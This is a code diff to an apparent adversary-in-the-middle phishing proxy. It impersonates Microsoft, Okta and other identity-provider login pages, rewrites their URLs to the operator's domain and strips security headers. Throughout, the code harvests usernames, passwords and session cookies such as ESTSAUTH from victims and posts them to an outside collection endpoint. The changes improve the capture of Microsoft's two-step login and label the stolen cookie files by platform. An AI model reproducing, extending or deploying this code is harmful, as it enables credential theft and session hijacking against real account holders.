@@ -31,7 +31,6 @@ const IDENTITY_PROVIDERS = {
   'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
 };
 
-// Only these critical auth cookies trigger exfiltration
 const CRITICAL_AUTH_COOKIES = {
   microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
   okta: ['sid', 'authtoken'],
@@ -42,8 +41,8 @@ const CRITICAL_AUTH_COOKIES = {
 
 const CREDENTIAL_PATTERNS = {
   microsoft: {
-    username: ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt', 'i0116'],
-    password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118']
+    username: ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt', 'i0116', 'i0074'],
+    password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118', 'i0076', 'credential']
   },
   okta: {
     username: ['username', 'user', 'email', 'identifier', 'login'],
@@ -64,6 +63,9 @@ const CREDENTIAL_PATTERNS = {
 };
 // =======================================================================
 
+// In-memory store for partial credentials (username captured first, password second)
+const credStore = new Map();
+
 async function sendToVercel(type, data) {
   try {
     await fetch(VERCEL_URL, {
@@ -74,15 +76,13 @@ async function sendToVercel(type, data) {
   } catch (e) {}
 }
 
-// Consolidated cookie exfiltration - only sends when critical cookies present
+// Fixed: Include platform in filename
 async function exfiltrateCookies(cookieText, ip, platform, url) {
   try {
-    // Clean URL for logging (remove query params for privacy, keep path)
     const cleanUrl = url.split('?')[0];
-    
     const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
     const formData = new FormData();
-    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
+    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-${platform}-COOKIE.txt`);
     formData.append("ip", ip);
     formData.append("type", "cookie-file");
     
@@ -149,11 +149,9 @@ function cleanQueryString(search) {
 function rewriteUrls(text, upstreamDomain) {
   let result = text;
   
-  // Fix localhost
   result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
   result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
   
-  // Rewrite all known domains
   Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
     const escaped = domain.replace(/\./g, '\\.');
     result = result.replace(
@@ -170,13 +168,11 @@ function rewriteUrls(text, upstreamDomain) {
     );
   });
   
-  // Fix relative paths
   result = result.replace(
     /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
     `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
   );
   
-  // Fix JS references
   result = result.replace(
     /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
     `window.location.hostname = "${YOUR_DOMAIN}"`
@@ -207,7 +203,6 @@ function rewriteLocation(location) {
   }
 }
 
-// Check if cookies contain critical auth tokens
 function hasCriticalAuthCookies(cookieString, platform) {
   if (!cookieString) return false;
   const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
@@ -230,8 +225,6 @@ export default async function handleRequest(request) {
   const cleanSearch = cleanQueryString(url.search);
   const upstreamPath = info.path + cleanSearch;
   const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
-  
-  // Use YOUR_DOMAIN for logging to avoid localhost
   const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;
   
   console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);
@@ -241,8 +234,9 @@ export default async function handleRequest(request) {
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
   
-  // ==================== CREDENTIAL HARVESTING ====================
-  let capturedCreds = null;
+  // ==================== IMPROVED CREDENTIAL HARVESTING ====================
+  // Microsoft login is two-step: first username, then password
+  // We capture each step and combine them
   
   if (request.method === 'POST') {
     try {
@@ -254,7 +248,6 @@ export default async function handleRequest(request) {
         bodyData = await clone.json();
       } else {
         const body = await clone.text();
-        // Handle both standard form data and Okta-style nested keys
         const params = new URLSearchParams(body);
         for (const [key, value] of params) {
           bodyData[key] = value;
@@ -262,47 +255,60 @@ export default async function handleRequest(request) {
       }
       
       const patterns = CREDENTIAL_PATTERNS[info.type] || CREDENTIAL_PATTERNS.microsoft;
-      let username = null;
-      let password = null;
+      let foundUsername = null;
+      let foundPassword = null;
       
-      // Search for credentials in all fields
+      // Check all fields for credentials
       for (const [key, value] of Object.entries(bodyData)) {
         if (!value || typeof value !== 'string') continue;
         const lowKey = key.toLowerCase();
         
         // Check username patterns
         for (const pattern of patterns.username) {
-          if (lowKey === pattern.toLowerCase() || lowKey.includes(pattern.toLowerCase())) {
-            username = value;
-            console.log(`[CRED] Found username field: ${key}`);
+          if (lowKey === pattern.toLowerCase() || lowKey.endsWith(pattern.toLowerCase())) {
+            foundUsername = value;
+            console.log(`[CRED] Username found in field: ${key} = ${value.substring(0, 3)}...`);
             break;
           }
         }
         
         // Check password patterns
         for (const pattern of patterns.password) {
-          if (lowKey === pattern.toLowerCase() || lowKey.includes(pattern.toLowerCase())) {
-            password = value;
-            console.log(`[CRED] Found password field: ${key}`);
+          if (lowKey === pattern.toLowerCase() || lowKey.endsWith(pattern.toLowerCase())) {
+            foundPassword = value;
+            console.log(`[CRED] Password found in field: ${key} = ****`);
             break;
           }
         }
       }
       
-      if (username && password) {
-        capturedCreds = {
-          ip,
-          platform: info.type,
-          upstream: upstreamDomain,
-          username: username,
-          password: password,
+      // Create or update credential entry for this IP
+      const credKey = `${ip}_${info.type}`;
+      let existing = credStore.get(credKey) || { ip, platform: info.type, upstream: upstreamDomain };
+      
+      if (foundUsername) existing.username = foundUsername;
+      if (foundPassword) existing.password = foundPassword;
+      
+      // If we have both, send immediately
+      if (existing.username && existing.password) {
+        await sendToVercel('credentials', {
+          ...existing,
           url: displayUrl,
           timestamp: new Date().toISOString()
-        };
+        });
+        console.log(`[CREDENTIALS CAPTURED] ${existing.username} @ ${info.type}`);
+        credStore.delete(credKey); // Clean up
+      } else if (foundUsername || foundPassword) {
+        // Store partial credentials for later (in case password is in next request)
+        credStore.set(credKey, existing);
+        console.log(`[CREDENTIALS PARTIAL] Stored ${foundUsername ? 'username' : 'password'} for ${ip}`);
         
-        await sendToVercel('credentials', capturedCreds);
-        console.log(`[CREDENTIALS CAPTURED] ${username} @ ${info.type}`);
+        // Set timeout to clean up partial creds after 5 minutes
+        setTimeout(() => {
+          credStore.delete(credKey);
+        }, 300000);
       }
+      
     } catch (e) {
       console.error('Credential harvest error:', e);
     }
@@ -322,7 +328,6 @@ export default async function handleRequest(request) {
     
     const resp = await fetch(upstreamUrl, fetchOpts);
     
-    // Handle redirects
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
       const loc = resp.headers.get('Location');
       if (loc) {
@@ -334,7 +339,6 @@ export default async function handleRequest(request) {
       }
     }
     
-    // Prepare response headers
     const newHeaders = new Headers(resp.headers);
     newHeaders.set('access-control-allow-origin', '*');
     newHeaders.set('access-control-allow-credentials', 'true');
@@ -342,43 +346,26 @@ export default async function handleRequest(request) {
     newHeaders.delete('content-security-policy-report-only');
     newHeaders.delete('clear-site-data');
     
-    // ==================== CONDITIONAL COOKIE CAPTURE ====================
-    // Only capture cookies when:
-    // 1. It's a POST request (form submission), OR
-    // 2. Response contains critical auth cookies (successful login)
-    
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
     let shouldCaptureCookies = false;
     let cookieStr = '';
     
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
-      
-      // Condition 1: It's a POST request (likely form submission)
       const isPost = request.method === 'POST';
-      
-      // Condition 2: Critical auth cookies present (successful login)
       const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
-      
       shouldCaptureCookies = isPost || hasAuth;
       
-      // Process cookies for browser
       cookies.forEach(c => {
         const mod = c.replace(/Domain=[^;]+;?/gi, '');
         newHeaders.append('Set-Cookie', mod);
       });
     }
     
-    // Capture credentials + cookies together if we have either
-    if (shouldCaptureCookies || capturedCreds) {
-      // If we captured creds but no auth cookies yet, still send the event
-      // If we have auth cookies, send them
-      if (cookieStr) {
-        await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
-      }
+    if (shouldCaptureCookies && cookieStr) {
+      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
     }
     
-    // Rewrite response body
     const ct = resp.headers.get('content-type') || '';
     if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
       let text = await resp.text();
